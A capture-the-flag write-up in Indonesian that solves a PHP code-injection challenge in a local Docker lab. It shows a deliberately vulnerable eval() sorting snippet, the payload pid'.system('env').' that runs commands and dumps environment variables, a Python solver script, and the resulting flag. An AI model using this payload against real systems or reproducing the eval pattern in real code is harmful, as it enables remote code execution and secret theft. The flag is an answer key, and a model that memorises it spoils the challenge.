# WriteUp: Rahasia Joko

## Overview

* **Judul:** Rahasia Joko
* **Kategori:** Input Injection
* **Poin:** 500
* **Deskripsi:** Bisa ngga lu mengungkap rahasia Joko?
* **Author:** (Unknown/Platform Specific)
* **URL:** `http://localhost:1337`

## Informasi Attachment

File yang diberikan adalah `codex2.yml`.

**Struktur Direktori:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Joko]
└─$ tree
.
├── codex2.yml
└── exploit.py

0 directories, 2 files

```

**Konten File (`codex2.yml`):**

```yaml
services:
  web:
    image: ghcr.io/hengkerrusia/codex2:latest
    ports:
      - "1337:8080"
    environment:
      - PWN=${PWN:-testuser}
    restart: unless-stopped

```

## Proses Penyelesaian

### 1. Menjalankan Environment

Challenge dijalankan menggunakan Docker Compose pada port **1337**.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Joko]
└─$ PWN=WanZKey docker compose -f codex2.yml up -d --build
[+] up 17/17
 ✔ Image ghcr.io/hengkerrusia/codex2:latest Pulled                                                                  6.9s
 ✔ Network rahasiajoko_default Created                                                                              0.3s
 ✔ Container rahasiajoko-web-1 Created                                                                              0.3s

```

### 2. Source Code Analysis (White Box)

Melakukan inspeksi file `index.php` di dalam container. Ditemukan penggunaan `eval()` yang tidak aman untuk membuat fungsi sorting dinamis.

**Snippet Vulnerable (`index.php`):**

```php
$order_by = $_GET['order_by'] ?? 'pid';

try {
    $func_name = 'sorter_' . uniqid();

    // 1. Input $order_by dimasukkan langsung ke dalam string function body
    // Konteks: Di dalam single quote array index ['$order_by']
    $func_body = "return strcmp(\$a['$order_by'], \$b['$order_by']);";

    // 2. VULNERABILITY: String dievaluasi sebagai kode PHP
    eval("function $func_name(\$a, \$b) { $func_body }");

    if (function_exists($func_name)) {
        usort($processes, $func_name);
    }
} catch (Throwable $e) {
}

```

**Analisis Kerentanan:**

1. **Vulnerable Function:** `eval()`.
2. **Injection Context:** Input user (`$order_by`) ditempatkan di dalam string yang merepresentasikan kode PHP, spesifiknya di dalam akses index array `$a['...']`.
3. **Exploit Strategy:** Penyerang dapat memanipulasi string untuk menyisipkan eksekusi kode. Karena berada di dalam single quote (`'`), kita dapat menggunakan *string concatenation* (`.`) untuk menyisipkan fungsi `system()`.
* Target Code: `return strcmp($a['INPUT'], ...)`
* Payload: `pid'.system('env').'`
* Result Code: `return strcmp($a['pid'.system('env').''], ...)`
* Saat PHP mengevaluasi kode tersebut, `system('env')` akan dieksekusi terlebih dahulu untuk menghasilkan string key array.



### 3. Exploitation

Mengirimkan payload melalui parameter GET `order_by` untuk memicu RCE dan mendapatkan flag dari environment variable.

## Script Solver

Script Python untuk melakukan eksploitasi otomatis.

**File:** `exploit.py`

```python
import requests
import re

# Target URL (Port 1337)
URL = "http://localhost:1337"

def exploit():
    print(f"[*] Target: {URL}")
    
    # Payload PHP Code Injection via Array Index Concatenation
    # Code target: strcmp($a['$order_by'], ...)
    # Payload: pid'.system('env').'
    # PHP akan mengeksekusi system('env') saat mengevaluasi string index array.
    payload = "pid'.system('env').'"
    
    print(f"[*] Sending Payload: {payload}")
    
    try:
        # Kirim GET request ke parameter 'order_by'
        r = requests.get(URL, params={'order_by': payload})
        
        if r.status_code == 200:
            print("[+] Injection Successful!")
            
            # Regex Flag pwn{...}
            flag = re.search(r'pwn\{.*?\}', r.text)
            
            if flag:
                print(f"\n[!!!] FLAG FOUND: {flag.group(0)}\n")
            else:
                print("[-] Flag regex failed.")
                print(r.text[:500]) 
        else:
            print(f"[-] Error Status: {r.status_code}")
            
    except Exception as e:
        print(f"[-] Connection Error: {e}")

if __name__ == "__main__":
    exploit()

```

## Output Terminal Solver

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Joko]
└─$ python3 exploit.py
[*] Target: http://localhost:1337
[*] Sending Payload: pid'.system('env').'
[+] Injection Successful!

[!!!] FLAG FOUND: pwn{d08d6a742a75da3e45ad4b1aeb584d05}

```

## Flag

```
pwn{d08d6a742a75da3e45ad4b1aeb584d05}

```
